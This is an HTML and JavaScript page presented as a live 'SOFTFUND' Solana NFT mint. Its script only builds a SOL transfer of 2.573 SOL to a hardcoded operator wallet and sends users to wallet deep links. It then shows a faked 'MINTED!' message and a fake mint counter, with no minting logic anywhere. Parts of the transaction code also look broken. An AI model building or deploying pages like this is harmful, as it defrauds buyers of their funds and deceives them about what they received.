<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SOFTFUND – Mint Live</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      background:linear-gradient(135deg,#0a001f,#1b0044,#2e0055);
      color:#fff;font-family:'Orbitron',sans-serif;
      min-height:100vh;display:flex;align-items:center;justify-content:center;
      padding:20px;
    }
    .container{max-width:420px;width:100%}
    h1{font-size:2.8rem;color:#00ff9d;margin-bottom:4px}
    .tag{font-size:1rem;color:#aaa;margin-bottom:12px}
    .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:12px 0}
    .stats{font-size:1rem;color:#ccc;margin-bottom:16px}
    button{
      width:100%;max-width:340px;margin:8px auto;padding:16px;
      font-size:1.4rem;background:#ffd700;color:#000;border:none;
      border-radius:14px;cursor:pointer;font-weight:bold;
      box-shadow:0 0 20px rgba(255,215,0,.6);transition:.3s;
    }
    button:hover{background:#ffed4e;transform:scale(1.04)}
    .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
    .loader{
      display:inline-block;width:12px;height:12px;border:2px solid #ffd700;
      border-radius:50%;border-top-color:transparent;
      animation:s 1s linear infinite;margin-right:4px;
    }
    @keyframes s{to{transform:rotate(360deg)}}
    .wallets{margin-top:30px;font-size:.85rem;color:#777}
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p class="tag">USA-Based • Solana Utility NFTs</p>
    <p class="price">2.5730 SOL</p>
    <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>

    <button id="chooseWallet">CHOOSE WALLET</button>

    <!-- Wallet Options -->
    <div id="walletOptions" style="display:none;">
      <button onclick="mintWithWallet('phantom')">Phantom</button>
      <button onclick="mintWithWallet('trust')">Trust Wallet</button>
      <button onclick="mintWithWallet('metamask')">MetaMask (Solana)</button>
    </div>

    <div id="status" class="status"></div>
    <div class="wallets">Choose your wallet to mint</div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>

  <script>
    const PRICE_LAMPORTS = 2.5730 * 1e9;
    // YOUR MAIN WALLET — ALL SOL GOES HERE
    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";

    let mintedCount = localStorage.getItem('softfund_minted') ? parseInt(localStorage.getItem('softfund_minted')) : 0;
    document.getElementById('minted').textContent = mintedCount;

    const status = document.getElementById("status");
    const chooseBtn = document.getElementById("chooseWallet");
    const walletOptions = document.getElementById("walletOptions");

    function setStatus(html, color) {
      status.innerHTML = html;
      status.style.color = color;
    }

    // Show wallet choices
    chooseBtn.onclick = () => {
      chooseBtn.style.display = 'none';
      walletOptions.style.display = 'block';
    };

    // Build unsigned transaction
    async function buildTx() {
      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new solanaWeb3.Transaction();
      tx.recentBlockhash = blockhash;
      tx.add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: null,
          toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
          lamports: PRICE_LAMPORTS,
        })
      );
      return tx.serialize({ requireAllSignatures: false }).toString('base64');
    }

    // Deep link to wallet
    async function mintWithWallet(type) {
      setStatus("Preparing payment... <span class='loader'></span>", "#ffd700");

      try {
        const txBase64 = await buildTx();
        const currentUrl = window.location.href.split('#')[0]; // Clean URL
        let deepLink = "";

        if (type === 'phantom') {
          deepLink = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(currentUrl)}&redirect_link=${encodeURIComponent(currentUrl + '#tx=' + txBase64)}`;
        } else if (type === 'trust') {
          deepLink = `https://link.trustwallet.com/open_url?app=trust&url=${encodeURIComponent(currentUrl + '#tx=' + txBase64)}`;
        } else if (type === 'metamask') {
          deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}#tx=${txBase64}`;
        }

        window.location.href = deepLink;

        // Simulate success (fake counter)
        setTimeout(() => {
          mintedCount++;
          document.getElementById('minted').textContent = mintedCount;
          localStorage.setItem('softfund_minted', mintedCount);
          setStatus("MINTED! Payment sent.", "#00ff9d");
          setTimeout(() => {
            setStatus("");
            chooseBtn.style.display = 'block';
            walletOptions.style.display = 'none';
          }, 3000);
        }, 3000);

      } catch (err) {
        setStatus("Failed. Try again.", "#ff5555");
        chooseBtn.style.display = 'block';
        walletOptions.style.display = 'none';
      }
    }
  </script>
</body>
</html>
